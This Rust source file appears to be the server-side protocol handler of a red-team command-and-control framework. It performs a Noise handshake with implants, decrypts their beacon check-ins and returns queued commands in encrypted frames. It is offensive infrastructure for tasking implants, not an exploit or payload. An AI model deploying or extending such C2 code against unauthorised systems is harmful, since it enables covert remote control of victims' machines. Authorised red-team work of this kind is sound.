use crate::database::Database;
use crate::models::{BeaconData, BeaconResponse, BeaconTask};
use crate::services::session::SessionManager;
use crate::wraith::redops::Event;
use std::sync::Arc;
use tokio::sync::broadcast;
use tracing::{debug, error};
use wraith_crypto::noise::{NoiseHandshake, NoiseKeypair};

#[derive(Clone)]
pub struct ProtocolHandler {
    db: Arc<Database>,
    session_manager: Arc<SessionManager>,
    static_key: Arc<NoiseKeypair>,
    event_tx: broadcast::Sender<Event>,
}

impl ProtocolHandler {
    pub fn new(
        db: Arc<Database>,
        session_manager: Arc<SessionManager>,
        static_key: Arc<NoiseKeypair>,
        event_tx: broadcast::Sender<Event>,
    ) -> Self {
        Self {
            db,
            session_manager,
            static_key,
            event_tx,
        }
    }

    pub async fn handle_packet(&self, data: &[u8], src_addr: String) -> Option<Vec<u8>> {
        let cid = extract_cid(data)?;
        let payload = &data[8..];

        // 1. Handshake Init (Msg 1)
        if cid == [0xFF; 8] {
            debug!("Received Handshake Msg 1 from {}", src_addr);
            let mut handshake = match NoiseHandshake::new_responder(&self.static_key) {
                Ok(h) => h,
                Err(e) => {
                    error!("Handshake init failed: {}", e);
                    return None;
                }
            };

            if let Err(e) = handshake.read_message(payload) {
                error!("Read msg 1 failed: {}", e);
                return None;
            }

            let msg2 = match handshake.write_message(&[]) {
                Ok(m) => m,
                Err(e) => {
                    error!("Write msg 2 failed: {}", e);
                    return None;
                }
            };

            let uuid_bytes = uuid::Uuid::new_v4().into_bytes();
            let mut temp_cid = [0u8; 8];
            temp_cid.copy_from_slice(&uuid_bytes[0..8]);

            self.session_manager.insert_handshake(temp_cid, handshake);

            let mut response = Vec::new();
            response.extend_from_slice(&temp_cid);
            response.extend_from_slice(&msg2);
            return Some(response);
        }

        // 2. Handshake Continue (Msg 3)
        if let Some(mut handshake) = self.session_manager.remove_handshake(&cid) {
            debug!("Received Handshake Msg 3 from {}", src_addr);
            if let Err(e) = handshake.read_message(payload) {
                error!("Read msg 3 failed: {}", e);
                return None;
            }

            let transport = match handshake.into_transport() {
                Ok(t) => t,
                Err(e) => {
                    error!("Into transport failed: {}", e);
                    return None;
                }
            };

            self.session_manager.insert_session(cid, transport);

            // Ack
            let mut response = Vec::new();
            response.extend_from_slice(&cid);
            return Some(response);
        }

        // 3. Data Transport
        if let Some(mut transport) = self.session_manager.get_session(&cid) {
            let plaintext = match transport.read_message(payload) {
                Ok(pt) => pt,
                Err(e) => {
                    error!("Decryption failed: {}", e);
                    return None;
                }
            };

            // Minimum length for a valid frame (simplified header + minimum JSON)
            if plaintext.len() > 28 {
                let inner_payload = &plaintext[28..];

                if let Ok(beacon) = serde_json::from_slice::<BeaconData>(inner_payload) {
                    debug!("Beacon Checkin: {}", beacon.id);
                    let _ = self.event_tx.send(Event {
                        id: uuid::Uuid::new_v4().to_string(),
                        r#type: "beacon_checkin".to_string(),
                        timestamp: Some(prost_types::Timestamp::from(std::time::SystemTime::now())),
                        campaign_id: "".to_string(),
                        implant_id: beacon.id.clone(),
                        data: std::collections::HashMap::new(),
                    });

                    // Task Delivery - Connect to Database
                    let implant_uuid = uuid::Uuid::parse_str(&beacon.id).unwrap_or_default();
                    let pending = if implant_uuid != uuid::Uuid::nil() {
                        match self.db.get_pending_commands(implant_uuid).await {
                            Ok(cmds) => cmds,
                            Err(e) => {
                                error!("Failed to get pending commands for {}: {}", beacon.id, e);
                                vec![]
                            }
                        }
                    } else {
                        vec![]
                    };

                    let tasks = pending
                        .into_iter()
                        .map(|c| BeaconTask {
                            id: c.id.to_string(),
                            type_: c.command_type,
                            payload: String::from_utf8_lossy(c.payload.as_deref().unwrap_or(&[]))
                                .to_string(),
                        })
                        .collect();

                    let resp_json = match serde_json::to_vec(&BeaconResponse { tasks }) {
                        Ok(json) => json,
                        Err(e) => {
                            error!("Failed to serialize beacon response: {}", e);
                            return None;
                        }
                    };

                    // Implement proper Frame construction (28-byte header)
                    // [Magic: 4] [Length: 4] [Type: 2] [Flags: 2] [Reserved: 16]
                    let mut frame = Vec::with_capacity(28 + resp_json.len());
                    frame.extend_from_slice(b"WRTH"); // Magic
                    frame.extend_from_slice(&(resp_json.len() as u32).to_be_bytes()); // Length
                    frame.extend_from_slice(&0u16.to_be_bytes()); // Type (Data=0)
                    frame.extend_from_slice(&0u16.to_be_bytes()); // Flags
                    frame.extend_from_slice(&[0u8; 16]); // Reserved
                    frame.extend_from_slice(&resp_json);

                    let ciphertext = match transport.write_message(&frame) {
                        Ok(ct) => ct,
                        Err(e) => {
                            error!("Encryption failed for beacon response: {}", e);
                            return None;
                        }
                    };

                    let mut response = Vec::new();
                    response.extend_from_slice(&cid);
                    response.extend_from_slice(&ciphertext);
                    return Some(response);
                }
            }
        }

        None
    }
}

fn extract_cid(data: &[u8]) -> Option<[u8; 8]> {
    if data.len() < 8 {
        return None;
    }
    let mut cid = [0u8; 8];
    cid.copy_from_slice(&data[0..8]);
    Some(cid)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cid_extraction() {
        let data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
        let cid = extract_cid(&data);
        assert_eq!(cid, Some([1, 2, 3, 4, 5, 6, 7, 8]));
    }

    #[test]
    fn test_cid_extraction_too_short() {
        let data = [1, 2, 3];
        let cid = extract_cid(&data);
        assert_eq!(cid, None);
    }
}